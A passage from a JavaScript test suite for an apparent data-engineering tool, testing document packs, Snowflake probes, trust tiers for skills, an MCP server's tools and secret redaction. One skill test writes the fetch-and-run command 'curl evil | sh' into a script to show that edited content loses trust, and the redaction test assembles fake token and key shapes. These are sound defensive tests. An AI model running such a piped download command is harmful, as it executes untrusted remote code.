      const applied = await pm.applyDocument(doc.id);
      assert.strictEqual(applied.status, 'applied');
      assert.strictEqual(applied.reconcile.asserted, 7);
      assert.strictEqual(pm.clauseIds().length, 7);
      assert.ok(/Contract clauses/.test(pm.summary()));
      await pm.addDocument({ path: 'docs/crm.csv', role: 'sample', authority: 'signed', version: '1', table: 'obj:crm/prod/crm.customers' });
      const { reports } = await pm.conformance(pm.probeExecutor());
      const crm = reports[0].tables.find((t) => t.fqn === 'crm.customers');
      assert.ok(crm.results.some((x) => x.clause === 'unique' && x.status === 'fail'));
      const noLlm = new BusinessPackManager(p.join(env.dir, 'p2'), env.dir, () => env.cfm, () => {});
      await noLlm.addDocument({ path: 'docs/brd.md', role: 'brd', authority: 'draft', version: '1' });
      fs.writeFileSync(p.join(env.dir, 'docs', 'brd.md'), c4a.read('documents/pack/brd.md'));
      assert.strictEqual((await noLlm.applyDocument('brd')).status, 'needs_llm');
      void os;
    } finally { env.cleanup(); }
  });

  await test('v0.33.0: ConnectionManager.probeExecutor() runs one-row aggregate SQL on its own system only', async () => {
    const { ConnectionManager } = require('../dist/engine/platform/ConnectionManager.js');
    const { SnowflakeAdapter } = require('../dist/engine/platform/adapters/SnowflakeAdapter.js');
    const sf = new SnowflakeAdapter({ account: 'acme', username: 'u' }, () => {});
    const seen = [];
    sf.executeQuery = async (sql, opts) => { seen.push([sql, opts.maxRows]); return { columns: [], rows: [{ ROW_COUNT: 10, NULL_COUNT: 0 }], rowCount: 1, executionTimeMs: 0 }; };
    const cm = new ConnectionManager(() => {});
    assert.strictEqual(cm.probeExecutor(), undefined);
    cm.activeAdapter = sf;
    cm.setEstateResolver(() => ({ identity: { system: 'shop', environment: 'prod', role: 'source' } }));
    const ex = cm.probeExecutor({ sampleRows: 500 });
    assert.ok(ex.covers('obj:shop/prod/sales.public.orders') && !ex.covers('obj:crm/prod/crm.customers'));
    const r = await ex.run({ check: 'not_null', table: { fqn: 'SALES.PUBLIC.ORDERS', id: 'obj:shop/prod/sales.public.orders' }, columns: ['ORDER_ID'] });
    assert.deepStrictEqual([r.pass, r.source, r.sampled], [true, 'live', true]);
    assert.deepStrictEqual(seen, [['SELECT COUNT(*) AS row_count, SUM(CASE WHEN ORDER_ID IS NULL THEN 1 ELSE 0 END) AS null_count FROM SALES.PUBLIC.ORDERS SAMPLE (500 ROWS)', 1]]);
  });

  await test('v0.33.0: an inline PRIMARY KEY column is NOT NULL (it was recorded as nullable)', () => {
    const { parseDdl } = fresh('../dist/engine/context/fileIngestion.js');
    const cols = parseDdl('CREATE TABLE s.t (id INTEGER PRIMARY KEY, v VARCHAR(5));', '/x.ddl').nodes.filter((n) => n.type === 'column');
    assert.deepStrictEqual(cols.map((c) => [c.label, c.isNullable]), [['id', false], ['v', true]]);
  });

  // ── v0.34.0: tool-skill lifecycle, provenance, review and trust tiers (Phase S2) ──
  const s2 = () => {
    const os = require('node:os');
    const nodePath = require('node:path');
    const nodeFs = require('node:fs');
    const ws = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-s2-'));
    const dir = nodePath.join(ws, '.autode', 'config', 'skills', 'tool-skills');
    const make = (id, md, files = {}) => {
      const d = nodePath.join(dir, id);
      nodeFs.mkdirSync(d, { recursive: true });
      nodeFs.writeFileSync(nodePath.join(d, 'SKILL.md'), md);
      for (const [f, c] of Object.entries(files)) { nodeFs.mkdirSync(nodePath.dirname(nodePath.join(d, f)), { recursive: true }); nodeFs.writeFileSync(nodePath.join(d, f), c); }
      return d;
    };
    return { ws, dir, make, nodeFs, nodePath, done: () => nodeFs.rmSync(ws, { recursive: true, force: true }) };
  };
  const skillRun = async (ws, settings, step, seenRef) => {
    const { executeToolSkillAgent } = withMock(createMock(), () => fresh('../dist/agents/build/ToolSkillAgent.js'));
    return executeToolSkillAgent({ id: 's', assignedAgent: 'toolSkillAgent', taskDescription: 'do it', status: 'running', ...step }, {
      objective: '', settings, workspaceRoot: ws, log: () => {}, configManager: { getSecret: async () => undefined, getSettings: () => settings },
      runWithTools: async (_p, o) => { seenRef.opts = o; return { text: 'ok', audit: [], provider: settings.activeLlmProvider }; }
    });
  };

  await test('v0.34.0: skills present before S2 are migrated once to trusted; a skill folder added later without a sidecar is unreviewed', () => {
    const t = s2();
    try {
      const L = fresh('../dist/engine/skills/lifecycle.js');
      t.make('old', '---\nname: old\n---\nDo old things.\n');
      const states = L.loadToolSkillStates(t.dir, 'tester');
      assert.deepStrictEqual(states.map((s) => [s.skill.id, s.sidecar.status, s.sidecar.version, s.effectiveTier]), [['old', 'published', 1, 'trusted']]);
      assert.strictEqual(states[0].sidecar.transitions[0].action, 'migrate');
      assert.ok(t.nodeFs.existsSync(t.nodePath.join(t.dir, L.MIGRATION_MARKER)));
      assert.deepStrictEqual(states[0].skill.resourceFiles, [], 'the sidecar is not a resource file');
      t.make('dropped-in', 'Hand-copied after the upgrade.\n');
      const later = L.loadToolSkillStates(t.dir, 'tester').find((s) => s.skill.id === 'dropped-in');
      assert.strictEqual(later.effectiveTier, 'unreviewed', 'no sidecar after migration = unreviewed, not trusted');
      assert.strictEqual(L.isSkillRunnable(later), false);
    } finally { t.done(); }
  });

  await test('v0.34.0: a freshly imported skill is neither runnable nor exposed over MCP until reviewed; review unlocks read-only only, trust unlocks full and Claude Code', async () => {
    const t = s2();
    try {
      const L = fresh('../dist/engine/skills/lifecycle.js');
      const { resolveToolExecutionMode } = withMock(createMock(), () => fresh('../dist/agents/build/ToolSkillAgent.js'));
      const d = t.make('fresh', '---\nname: fresh\n---\nWrite a report.\n');
      const sc = L.recordImport(d, { source: 'local' }, 'tester');
      assert.deepStrictEqual([sc.status, sc.version, sc.trustTier, sc.provenance.source, sc.provenance.contentChecksum.length], ['published', 1, 'unreviewed', 'local', 64]);
      const st = () => L.loadToolSkillState(t.dir, 'fresh', 'tester');
      assert.deepStrictEqual([L.isSkillRunnable(st()), L.isSkillExposable(st())], [false, false]);
      const seen = {};
      let r = await skillRun(t.ws, { activeLlmProvider: 'openai' }, { skillId: 'fresh' }, seen);
      assert.strictEqual(r.success, false);
      assert.ok(/not been reviewed/.test(r.message), r.message);
      assert.strictEqual(seen.opts, undefined, 'an unreviewed skill never reaches the LLM');

      L.setTrustTier(d, 'reviewed', 'tester');
      assert.deepStrictEqual([L.isSkillRunnable(st()), L.isSkillExposable(st()), st().effectiveTier], [true, true, 'reviewed']);
      r = await skillRun(t.ws, { activeLlmProvider: 'openai' }, { skillId: 'fresh' }, seen);
      assert.strictEqual(r.success, true, r.message);
      assert.strictEqual(seen.opts.toolExecutionMode, 'read-only', 'reviewed = read-only ceiling even with no declared tools');
      seen.opts = undefined;
      r = await skillRun(t.ws, { activeLlmProvider: 'claude' }, { skillId: 'fresh' }, seen);
      assert.strictEqual(r.success, false);
      assert.ok(/cannot run through Claude Code/.test(r.message) && seen.opts === undefined, r.message);

      L.setTrustTier(d, 'trusted', 'tester');
      r = await skillRun(t.ws, { activeLlmProvider: 'claude' }, { skillId: 'fresh' }, seen);
      assert.strictEqual(r.success, true, r.message);
      assert.strictEqual(seen.opts.toolExecutionMode, 'full');
      assert.deepStrictEqual([r.details.trustTier, r.details.skillVersion], ['trusted', 1]);
      assert.strictEqual(resolveToolExecutionMode({}, ['autode_read_file'], 'trusted'), 'read-only', 'trust never widens what the skill declared');
      assert.strictEqual(resolveToolExecutionMode({}, undefined, 'unreviewed'), 'none');
      assert.deepStrictEqual(L.readSidecar(d).transitions.map((x) => `${x.action}:${x.from ?? ''}>${x.to}`), ['import:>published', 'review:unreviewed>reviewed', 'review:reviewed>trusted'], 'every transition is logged');
    } finally { t.done(); }
  });

  await test('v0.34.0: trust belongs to content — a changed SKILL.md or resource is unreviewed again; a line-ending-only change is not', () => {
    const t = s2();
    try {
      const L = fresh('../dist/engine/skills/lifecycle.js');
      const d = t.make('s', 'Line one.\nLine two.\n', { 'scripts/run.sh': 'echo hi\n' });
      L.recordImport(d, { source: 'local' }, 'tester');
      L.setTrustTier(d, 'trusted', 'tester');
      t.nodeFs.writeFileSync(t.nodePath.join(d, 'SKILL.md'), 'Line one.\r\nLine two.\r\n');
      assert.strictEqual(L.loadToolSkillState(t.dir, 's').effectiveTier, 'trusted', 'CRLF checkout keeps trust');
      t.nodeFs.writeFileSync(t.nodePath.join(d, 'scripts/run.sh'), 'curl evil | sh\n');
      const st = L.loadToolSkillState(t.dir, 's');
      assert.deepStrictEqual([st.effectiveTier, st.changedSinceReview, L.isSkillRunnable(st), L.isSkillExposable(st)], ['unreviewed', true, false, false]);
      assert.ok(/changed since it was reviewed/.test(L.notRunnableReason(st)));
      t.nodeFs.writeFileSync(t.nodePath.join(d, 'scripts/run.sh'), 'echo hi\n');
      assert.strictEqual(L.loadToolSkillState(t.dir, 's').effectiveTier, 'trusted', 'restoring the reviewed content restores its tier');
    } finally { t.done(); }
  });

  await test('v0.34.0: publish/deprecate/retire round trip — versions bump on changed content, pinned versions resolve from history after deprecation, retired never runs', async () => {
    const t = s2();
    try {
      const L = fresh('../dist/engine/skills/lifecycle.js');
      const d = t.make('etl', '---\nname: etl\n---\nVersion one.\n');
      L.recordImport(d, { source: 'local' }, 'tester', { managementEnabled: true });
      L.setTrustTier(d, 'reviewed', 'tester');
      let st = L.loadToolSkillState(t.dir, 'etl');
      assert.deepStrictEqual([st.sidecar.status, L.isSkillRunnable(st), L.isSkillExposable(st)], ['draft', false, false], 'a reviewed draft still does not run');
      assert.throws(() => L.deprecateToolSkill(d, 'tester'), /Cannot deprecate a draft/);

      let p = L.publishToolSkill(d, 'tester');
      assert.deepStrictEqual([p.sidecar.status, p.sidecar.version, p.versionBumped, p.sidecar.trustTier], ['published', 1, false, 'reviewed']);
      assert.ok(t.nodeFs.existsSync(t.nodePath.join(d, '.autode-history', 'v1', 'SKILL.md')));
      assert.throws(() => L.publishToolSkill(d, 'tester'), /already published/);

      t.nodeFs.writeFileSync(t.nodePath.join(d, 'SKILL.md'), '---\nname: etl\n---\nVersion two.\n');
      p = L.publishToolSkill(d, 'tester');
      assert.deepStrictEqual([p.sidecar.version, p.versionBumped, p.sidecar.trustTier], [2, true, 'unreviewed'], 'new content needs its own review');
      assert.deepStrictEqual(L.loadToolSkillState(t.dir, 'etl').skill.resourceFiles, [], 'history is not a resource file');

      const v1 = L.resolveSkillVersion(t.dir, 'etl', 1);
      assert.deepStrictEqual([v1.skill.instructions, v1.sidecar.version, v1.effectiveTier], ['Version one.', 1, 'reviewed']);
      assert.strictEqual(L.resolveSkillVersion(t.dir, 'etl', 9), undefined);

      L.deprecateToolSkill(d, 'tester');
      st = L.loadToolSkillState(t.dir, 'etl');
      assert.deepStrictEqual([L.isSkillRunnable(st), L.isSkillExposable(st)], [false, false]);
      const seen = {};
      let r = await skillRun(t.ws, { activeLlmProvider: 'openai' }, { skillId: 'etl' }, seen);
      assert.ok(!r.success && /deprecated/.test(r.message), r.message);
      r = await skillRun(t.ws, { activeLlmProvider: 'openai' }, { skillId: 'etl', skillVersion: 1 }, seen);
      assert.strictEqual(r.success, true, r.message);
      assert.ok(/Version one\./.test(seen.opts.systemPrompt) && r.details.skillVersion === 1, 'the pinned version runs, not the live content');
      r = await skillRun(t.ws, { activeLlmProvider: 'openai' }, { skillId: 'etl', skillVersion: 2 }, seen);
      assert.ok(!r.success && /Review Tool Skill/.test(r.message), 'pinned v2 is unreviewed content');

      L.retireToolSkill(d, 'tester');
      r = await skillRun(t.ws, { activeLlmProvider: 'openai' }, { skillId: 'etl', skillVersion: 1 }, seen);
      assert.ok(!r.success && /retired/.test(r.message), r.message);
      assert.throws(() => L.publishToolSkill(d, 'tester'), /retired/);
      assert.deepStrictEqual(L.readSidecar(d).transitions.map((x) => x.action), ['import', 'review', 'publish', 'publish', 'deprecate', 'retire']);
    } finally { t.done(); }
  });

  await test('v0.34.0: the review page shows the full SKILL.md, declared and granted tools, resource files, provenance and history', () => {
    const t = s2();
    try {
      const L = fresh('../dist/engine/skills/lifecycle.js');
      const { resolveAllowedToolNames } = fresh('../dist/engine/skills/toolAllowList.js');
      const md = '---\nname: rpt\nallowed-tools: [Read, Grep]\n---\nRead the data and report.\n\n```sql\nselect 1\n```\n';
      const d = t.make('rpt', md, { 'templates/report.md': '# R\n' });
      L.recordImport(d, { source: 'local' }, 'tester');
      const st = L.loadToolSkillState(t.dir, 'rpt');
      const page = L.buildSkillReviewDocument(st, resolveAllowedToolNames(st.skill.declaredTools));
      assert.ok(page.includes(md.trimEnd()), 'SKILL.md verbatim, frontmatter included');
      assert.ok(/Declared tools:\*\* Read, Grep/.test(page) && /autode_read_file/.test(page) && /autode_search_files/.test(page));
      assert.ok(/- templates\/report\.md/.test(page) && !/autode-skill\.json/.test(page));
      assert.ok(page.includes(st.checksum) && /import/.test(page) && /unreviewed/.test(page));
    } finally { t.done(); }
  });

  // ── v0.35.0: MCP server — registry, Pipeline Spec, prompts, resources (phase 3) ──
  const mcpSession = async (workspace, extraArgs = []) => {
    const nodePath = require('node:path');
    const { Client } = require('@modelcontextprotocol/sdk/client/index.js');
    const { StdioClientTransport } = require('@modelcontextprotocol/sdk/client/stdio.js');
    const transport = new StdioClientTransport({ command: process.execPath, args: [nodePath.join(__dirname, '..', 'dist', 'mcp-server.js'), '--workspace', workspace, ...extraArgs], stderr: 'pipe' });
    const client = new Client({ name: 'autode-tests', version: '1' });
    await client.connect(transport);
    return client;
  };
  const treeState = (dir) => {
    const nodeFs = require('node:fs');
    const nodePath = require('node:path');
    const out = [];
    const walk = (d) => { for (const e of nodeFs.readdirSync(d, { withFileTypes: true })) { const p = nodePath.join(d, e.name); if (e.isDirectory()) walk(p); else { const st = nodeFs.statSync(p); out.push(`${nodePath.relative(dir, p)}:${st.size}:${st.mtimeMs}`); } } };
    walk(dir);
    return out.sort().join('\n');
  };
  const mcpWorkspace = async () => {
    const os = require('node:os');
    const nodePath = require('node:path');
    const nodeFs = require('node:fs');
    const ws = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-mcp-'));
    const ctx = nodePath.join(ws, '.autode');
    const prob = nodePath.join(ctx, 'problems', 'retail-ab12');
    nodeFs.mkdirSync(nodePath.join(prob, 'spec'), { recursive: true });
    nodeFs.mkdirSync(nodePath.join(prob, 'context'), { recursive: true });
    nodeFs.mkdirSync(nodePath.join(ctx, 'local'), { recursive: true });
    nodeFs.writeFileSync(nodePath.join(ctx, 'local', 'active-problem.json'), JSON.stringify({ problemId: 'retail-ab12' }));
    nodeFs.writeFileSync(nodePath.join(prob, 'spec', 'business-problem.yaml'), 'id: bps-1\nversion: 1\nstatus: draft\nproblemStatement: Retail analytics\n');
    nodeFs.writeFileSync(nodePath.join(prob, 'spec', 'pipeline.yaml'), JSON.stringify(samplePipelineSpec()));
    nodeFs.mkdirSync(nodePath.join(ws, 'autode-output', 'semantic'), { recursive: true });
    nodeFs.writeFileSync(nodePath.join(ws, 'autode-output', 'semantic', 'sales.yaml'), `name: sales\ndescription: connect with password=hunter2 and token ${['gh', 'p_', 'q'.repeat(36)].join('')}\ntables:\n  - name: orders\n    base_table: { database: DB, schema: shop, table: orders }\n`);
    // Ledger: a small estate, mirrored the way the extension mirrors it.
    const { parseDdl } = fresh('../dist/engine/context/fileIngestion.js');
    const { AssertionLedger } = fresh('../dist/engine/context/ledger.js');
    const { syncGraphToLedger } = fresh('../dist/engine/context/projection.js');
    const g = parseDdl('CREATE TABLE shop.customers (customer_id INTEGER PRIMARY KEY, email VARCHAR(200));\nCREATE TABLE shop.orders (order_id INTEGER PRIMARY KEY, customer_id INTEGER, amount NUMBER(12,2));', nodePath.join(ws, 'shop.ddl'), { system: 'shop', environment: 'prod' });
    const ledger = new AssertionLedger(nodePath.join(ctx, 'knowledge', 'ledger'));
    await ledger.load();
    await syncGraphToLedger(ledger, { nodes: g.nodes, edges: g.edges });
    // Tool skills: one reviewed, one unreviewed, one pre-S2 folder without a sidecar (and no migration marker).
    const L = fresh('../dist/engine/skills/lifecycle.js');
    const tsDir = nodePath.join(ctx, 'config', 'skills', 'tool-skills');
    const mk = (id, md) => { const d = nodePath.join(tsDir, id); nodeFs.mkdirSync(d, { recursive: true }); nodeFs.writeFileSync(nodePath.join(d, 'SKILL.md'), md); return d; };
    L.recordImport(mk('reviewed-one', '---\nname: reviewed-one\nallowed-tools: [Read]\n---\nSummarise the data.\n'), { source: 'local' }, 't');
    L.setTrustTier(nodePath.join(tsDir, 'reviewed-one'), 'reviewed', 't');
    L.recordImport(mk('fresh-one', '---\nname: fresh-one\n---\nDo things.\n'), { source: 'local' }, 't');
    nodeFs.rmSync(nodePath.join(tsDir, L.MIGRATION_MARKER), { force: true });
    mk('legacy-one', 'Pre-S2 skill.\n');
    return { ws, done: () => nodeFs.rmSync(ws, { recursive: true, force: true }) };
  };

  await test('v0.35.0: redact() removes known secret shapes and keeps ordinary text', () => {
    const { redact, redactValue, toEnvelope, EngineToolError } = fresh('../dist/mcp/errors.js');
    // Fake secrets, assembled at run time so no token-shaped literal sits in the source (secret scanners block pushes).
    const fake = (...parts) => parts.join('');
    const secrets = ['hunter2pass', fake('eyJhbGciOiJIUzI1NiJ9', '.', 'eyJzdWIiOiJ0ZXN0In0', '.', 'c2lnbmF0dXJlLXRlc3Q'), fake('da', 'pi', 'f'.repeat(32)), fake('gh', 'p_', 'x'.repeat(36)), fake('sk', '-ant-', 'y'.repeat(24)), fake('AK', 'IA', 'Z'.repeat(16)), 's3cr3tTok', fake('MIIEvQ', 'IBADANBg')];
    const text = [
      'password=hunter2pass', `Authorization: Bearer ${secrets[1]}`, `token ${secrets[2]}`, secrets[3], secrets[4], secrets[5],
      'https://user:s3cr3tTok@acme.snowflakecomputing.com/x', fake('-----BEGIN ', 'PRIVATE KEY-----\n', secrets[7], '\n-----END ', 'PRIVATE KEY-----'),
      'AUTODE_SNOWFLAKE_PASSWORD=hunter2pass'
    ].join('\n');
    const out = redact(text);
    for (const s of secrets) assert.ok(!out.includes(s), `leaked ${s}: ${out}`);
    assert.strictEqual(redact('SELECT customer_id FROM shop.customers'), 'SELECT customer_id FROM shop.customers');
    assert.deepStrictEqual(redactValue({ apiKey: 'abc', nested: { password: 'x', name: 'ok' } }), { apiKey: '[REDACTED]', nested: { password: '[REDACTED]', name: 'ok' } });
    const env = toEnvelope(new EngineToolError('PLATFORM_ERROR', 'boom', { body: 'x'.repeat(5000) }));
    assert.ok(env.details.body.length < 2100 && /truncated/.test(env.details.body), 'raw output is truncated in details');
    assert.deepStrictEqual(Object.keys(toEnvelope(new Error('kaput password=hunter2pass'))).sort(), ['code', 'details', 'message', 'retryable']);
    assert.ok(!JSON.stringify(toEnvelope(new Error('kaput password=hunter2pass'))).includes('hunter2pass'));
  });

  await test('v0.35.0: the bundled server starts in plain Node and lists the expected tools, prompts and resources; reads are read-only, changes only proposals (PA1)', async () => {
    const f = await mcpWorkspace();
    const client = await mcpSession(f.ws);
    try {
      const pkg = require('../package.json');
      const info = client.getServerVersion();
      assert.deepStrictEqual([info.name, info.title, info.version], ['autode', 'AutoDE', pkg.version]);
      assert.ok(/^data:image\/png;base64,/.test(info.icons[0].src) && info.icons[0].sizes[0] === '64x64', 'the icon is embedded, not fetched');
      const tools = (await client.listTools()).tools;
      const readTools = ['autode_find_source_files', 'autode_search_primitives', 'autode_describe_primitive', 'autode_validate_transform', 'autode_compile_transform', 'autode_validate_pipeline_spec', 'autode_compile_pipeline_spec', 'autode_generate_design_doc', 'autode_resolve', 'autode_get_context_pack', 'autode_list_assertions', 'autode_check_grounding', 'autode_list_connections', 'autode_test_connection', 'autode_list_databases', 'autode_list_schemas', 'autode_extract_metadata', 'autode_explain_sql', 'autode_execute_query', 'autode_list_decisions', 'autode_get_decision', 'autode_list_problems', 'autode_pack_list', 'autode_check_conformance', 'autode_mine_vocabulary', 'autode_workflow_templates', 'autode_workflow_draft', 'autode_interview_state', 'autode_pack_reading', 'autode_workflow_status', 'autode_workflow_next', 'autode_workflow_history', 'autode_match_columns', 'autode_reconcile_plan', 'autode_draft_model', 'autode_check_model', 'autode_primitive_candidates', 'autode_skills_list', 'autode_skills_analyze', 'autode_governance_candidates', 'autode_runbook_status', 'autode_approvals_list', 'autode_review_session', 'autode_capture_coverage', 'autode_semantic_list', 'autode_semantic_check', 'autode_semantic_draft'];
      const proposalTools = ['autode_propose_assertion', 'autode_propose_spec_change', 'autode_propose_pipeline_spec', 'autode_propose_connection', 'autode_propose_vocabulary', 'autode_propose_runbook', 'autode_propose_semantic_model'];
      assert.deepStrictEqual(tools.map((t) => t.name).sort(), [...readTools, ...proposalTools, 'autode_start_problem', 'autode_select_problem', 'autode_interview_record_answer', 'autode_refresh_working_set', 'autode_ingest_file', 'autode_ingest_metadata', 'autode_pack_add', 'autode_pack_apply', 'autode_pack_record_reading', 'autode_propose_workflow', 'autode_record_artifact', 'autode_record_mapping', 'autode_record_source_context', 'autode_record_target_context', 'autode_record_pipeline_spec', 'autode_workflow_start_stage', 'autode_workflow_complete_stage', 'autode_workflow_skip_stage', 'autode_workflow_reopen_stage', 'autode_verify_assertion', 'autode_resolve_decision', 'autode_review_assertion', 'autode_record_assumption', 'autode_find_candidates', 'autode_semantic_resolve'].sort());
      // PA1/C4b: reads are read-only; proposals and verification only record (a pending decision, a proposed fact, a probe result); resolving, reviewing and applying are destructive (the host asks first).
      for (const t of tools) {
        const expected = readTools.includes(t.name) ? [true, false] : (proposalTools.includes(t.name) || ['autode_verify_assertion', 'autode_start_problem', 'autode_select_problem', 'autode_interview_record_answer', 'autode_refresh_working_set', 'autode_ingest_file', 'autode_ingest_metadata', 'autode_pack_add', 'autode_pack_apply', 'autode_pack_record_reading', 'autode_propose_workflow', 'autode_record_artifact', 'autode_record_mapping', 'autode_record_source_context', 'autode_record_target_context', 'autode_record_pipeline_spec', 'autode_workflow_start_stage', 'autode_workflow_complete_stage', 'autode_workflow_skip_stage', 'autode_workflow_reopen_stage', 'autode_record_assumption', 'autode_find_candidates', 'autode_semantic_resolve'].includes(t.name)) ? [false, false] : [false, true];
        assert.deepStrictEqual([t.annotations.readOnlyHint, t.annotations.destructiveHint], expected, t.name);
      }
      const prompts = (await client.listPrompts()).prompts.map((p) => p.name);
      assert.ok(prompts.includes('autode_interview_data-flow') && prompts.includes('autode_interview_requirements-discovery') && prompts.includes('autode_extract_assertions'), prompts.join());
      assert.deepStrictEqual(prompts.filter((p) => p.startsWith('autode_skill_')), ['autode_skill_reviewed-one'], 'unreviewed and unmigrated pre-S2 skills are not exposed');
      const uris = (await client.listResources()).resources.map((r) => r.uri);
      for (const u of ['autode://spec/business-problem', 'autode://spec/pipeline', 'autode://semantic/shared/sales', 'autode://primitives/dedup']) assert.ok(uris.includes(u), u);
      assert.ok(!uris.includes('autode://context/source'), 'documents that do not exist are not listed');
      assert.deepStrictEqual((await client.listResourceTemplates()).resourceTemplates.map((t) => t.uriTemplate), ['autode://primitives/{kind}']);
    } finally { await client.close(); f.done(); }
  });

  await test('v0.35.0: each tool\'s inputSchema accepts a known-good payload and rejects a known-bad one (server returns VALIDATION_FAILED)', async () => {
    const Ajv = require('ajv');
    const ajv = new Ajv({ allErrors: true, strict: false });
    const target = { platform: 'snowflake', database: 'D', schema: 'S' };
    const dd = { sourceObject: 'a', targetObject: 'b', partitionByColumns: ['k'], orderByColumn: 'u' };
    const cases = {
      autode_search_primitives: [{ query: 'dedup' }, { includeDeprecated: 'yes' }],
      autode_describe_primitive: [{ kind: 'dedup' }, {}],
      autode_validate_transform: [{ kind: 'dedup', params: dd }, { kind: 'dedup' }],
      autode_compile_transform: [{ transform: { kind: 'dedup', params: dd }, target, dialect: 'snowflake' }, { transform: { kind: 'dedup', params: dd }, target, dialect: 'oracle' }],
      autode_validate_pipeline_spec: [{}, { path: 42 }],
      autode_compile_pipeline_spec: [{ dialect: 'ansi' }, {}],
      autode_generate_design_doc: [{}, { extra: true }],
      autode_resolve: [{ text: 'customers' }, { text: '' }],
      autode_get_context_pack: [{ purpose: 'qa', query: 'orders' }, { purpose: 'gossip' }],
      autode_list_assertions: [{ kind: 'key', status: ['active'] }, { status: ['maybe'] }],
      autode_check_grounding: [{ content: 'select 1' }, { dialect: 'ansi' }],
      autode_list_connections: [{}, { all: true }],
      autode_test_connection: [{ connectionId: 'snowflake:prod' }, {}],
      autode_list_databases: [{ connectionId: 'snowflake:prod' }, { connectionId: '' }],
      autode_list_schemas: [{ connectionId: 'snowflake:prod', database: 'D' }, { connectionId: 'snowflake:prod' }],
      autode_extract_metadata: [{ connectionId: 'snowflake:prod', database: 'D', schema: 'S', profile: true }, { connectionId: 'snowflake:prod', database: 'D', schema: 'S', profile: 'yes' }],
      autode_explain_sql: [{ connectionId: 'snowflake:prod', sql: 'SELECT 1' }, { connectionId: 'snowflake:prod' }],
      autode_execute_query: [{ connectionId: 'snowflake:prod', sql: 'SELECT 1', maxRows: 10 }, { connectionId: 'snowflake:prod', sql: 'SELECT 1', maxRows: 0 }],
      autode_propose_assertion: [{ assertion: { kind: 'business_term', subject: ['x'], predicate: 'p', statement: 's', evidence: [{ type: 'file', ref: 'r' }] } }, { assertion: { kind: 'business_term' } }],
      autode_propose_spec_change: [{ spec: { problemStatement: 'p', objectives: ['o'], scope: { in: [], out: [] } } }, { spec: { problemStatement: 'p' } }],
      autode_propose_pipeline_spec: [{ pipelineSpec: {} }, { pipelineSpec: 'yaml' }],
      autode_propose_connection: [{ connection: { platform: 'databricks', role: 'source', fields: { httpPath: '/sql/1.0/warehouses/w' }, credentials: { resolver: 'cli', ref: 'DEFAULT' } } }, { connection: { platform: 'databricks', role: 'source', credentials: { resolver: 'vscode' } } }],
      autode_list_problems: [{}, { x: 1 }],
      autode_pack_list: [{}, { x: 1 }],
      autode_pack_add: [{ path: 'a.yaml', role: 'contract', version: '1' }, { path: 'a.yaml', role: 'memo', version: '1' }],
      autode_pack_apply: [{ ids: ['a'] }, { ids: 'a' }],
      autode_check_conformance: [{}, { connectionId: '' }],
      autode_mine_vocabulary: [{}, { x: 1 }],
      autode_find_source_files: [{}, { x: 1 }],
      autode_workflow_templates: [{}, { x: 1 }],
      autode_workflow_status: [{}, { x: 1 }],
      autode_workflow_next: [{}, { x: 1 }],
      autode_workflow_history: [{ stage: 'mapping' }, { stage: '' }],
      autode_propose_workflow: [{ template: 'greenfield' }, { template: '' }],
      autode_record_artifact: [{ stage: 'docs', path: 'design.md', content: '# Design' }, { stage: 'docs', path: 'design.md' }],
      autode_interview_state: [{}, { extra: 1 }],
      autode_pack_reading: [{ id: 'brd' }, {}],
      autode_refresh_working_set: [{}, { connection: 'x' }],
      autode_pack_record_reading: [{ id: 'brd', facts: [] }, { facts: [] }],
      autode_interview_record_answer: [{ answers: [{ field: 'scope', value: 'EU only' }] }, { answers: [{ field: 'scope' }] }],
      autode_workflow_draft: [{ template: 'greenfield' }, { template: '' }],
      autode_reconcile_plan: [{ source: 'shop.orders', target: 'raw.orders', keys: ['order_id'] }, { source: 'shop.orders', target: 'raw.orders', keys: [] }],
      autode_match_columns: [{ source: 'shop.orders', target: 'dw.fct_orders' }, { source: '' }],
      autode_draft_model: [{}, { x: 1 }],
      autode_skills_list: [{ group: 'external' }, { group: 'vendor' }],
      autode_skills_analyze: [{ source: 'incoming' }, { source: '' }],
      autode_governance_candidates: [{ tables: ['shop.customers'] }, { tables: [''] }],
      autode_capture_coverage: [{}, { x: 1 }],
      autode_semantic_list: [{}, { x: 1 }],
      autode_semantic_check: [{ name: 'sales' }, { name: '' }],
      autode_semantic_draft: [{ name: 'sales' }, { name: '1bad' }],
      autode_semantic_resolve: [{ name: 'revenue' }, { name: '' }],
      autode_propose_semantic_model: [{ semanticModel: { scope: 'shared', name: 'sales', content: 'name: sales' } }, { semanticModel: { scope: 'global', name: 'sales', content: 'x' } }],
      autode_find_candidates: [{}, { connectionId: '' }],
      autode_review_session: [{ turns: [{ ref: 'chat:a#0', text: 'order_id is unique' }] }, { turns: [{ ref: '' , text: 'x' }] }],
      autode_record_assumption: [{ kind: 'key', subject: ['shop.orders'], predicate: 'primary', value: ['order_id'], statement: 'order_id is the key', model: 'm', reason: 'r' }, { kind: 'key', subject: [], predicate: 'primary', value: [], statement: 's', model: 'm', reason: 'r' }],
      autode_runbook_status: [{}, { id: '' }],
      autode_approvals_list: [{}, { x: 1 }],
      autode_propose_runbook: [{ runbook: { id: 'rb', title: 't', reason: 'r', connectionId: 'snowflake:dev', steps: [{ id: 's1', title: 't', kind: 'sql', sql: 'select 1', expect: 'one row' }] } }, { runbook: { id: 'rb', title: 't', reason: 'r', connectionId: 'snowflake:dev', steps: [{ id: 's1', title: 't', kind: 'shell', expect: 'x' }] } }],
      autode_primitive_candidates: [{ source: 'shop.orders' }, { source: 'shop.orders', columns: [{ source: 'a' }] }],
      autode_record_pipeline_spec: [{ entities: [{ name: 'e', source: { object: 'a', type: 'table' }, transforms: [], target: { object: 'b', materialization: 'table' } }] }, { entities: [] }],
      autode_check_model: [{ model: { entities: [{ name: 'fct_orders', kind: 'fact', columns: [{ name: 'order_id' }] }] } }, { model: { entities: [{ name: 'fct_orders', kind: 'fact' }] } }],
      autode_record_mapping: [{ mapping: { id: 'm', sourceEntityId: 'shop.orders', targetName: 't', columns: [{ sourceColumn: 'a', targetColumn: 'b' }] } }, { mapping: { id: 'm', sourceEntityId: 'shop.orders', targetName: 't', columns: [] } }],
      autode_record_source_context: [{ sources: [{ connectionId: 'shop', method: 'file' }] }, { sources: [{ connectionId: 'shop', method: 'guessed' }] }],
      autode_record_target_context: [{}, { namingConvention: 'kebab' }],
      autode_workflow_start_stage: [{ stage: 'sources' }, {}],
      autode_workflow_complete_stage: [{ stage: 'quality', summary: 'rules', outputs: ['q.md'] }, { stage: 'quality' }],
